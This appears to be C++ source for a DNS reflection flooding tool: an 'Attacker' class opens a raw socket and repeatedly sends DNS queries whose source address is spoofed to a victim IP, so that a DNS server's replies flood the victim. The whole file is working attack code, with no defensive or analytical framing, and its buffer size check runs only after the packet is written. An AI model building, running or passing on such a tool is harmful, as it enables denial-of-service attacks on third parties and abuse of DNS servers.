#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string>
#include "./raw.h"
#include "./util.h"
#define DOMAIN_MAX_LENGTH 128

class Attacker {
   public:
    uint32_t vctip;
    uint32_t dnssvrip;
    uint16_t srcport;
    uint16_t dnstyp;
    uint16_t dnsclz = DNS_QCLZ_STD;
    std::string domain;
    void attack(int);
};

void Attacker::attack(int time) {
    int sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sd == -1) {
        printf("Fail to create a socket.\n");
        return;
    }
    uint8_t* buff = (uint8_t*)malloc(128);
    int packetSize = createPacket(buff, vctip, dnssvrip, srcport,
                                  domain.c_str(), dnstyp, dnsclz);
    if (packetSize > 128) {
        printf("Buffer size too small.\n");
        return;
    }

    buff = (uint8_t*)realloc(buff, packetSize);
    sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(PORT_DNS);
    sin.sin_addr.s_addr = dnssvrip;
    sockaddr* addr = (sockaddr*)&sin;
    if (time == 0) time = -1;

    int counter = 0, success;
    while (time < 0 || time--) {
        success = sendto(sd, buff, packetSize, 0, addr, sizeof(sin));
        printf("%s", success ? "." : "x");
        counter++;
        if (counter == 32) {
            printf("\n");
            counter = 0;
        }  //
        else if (counter % 4 == 0) {
            printf(" ");
        }
        fflush(stdout);
        sleep(1);
    }
    printf("\nDone.\n");
}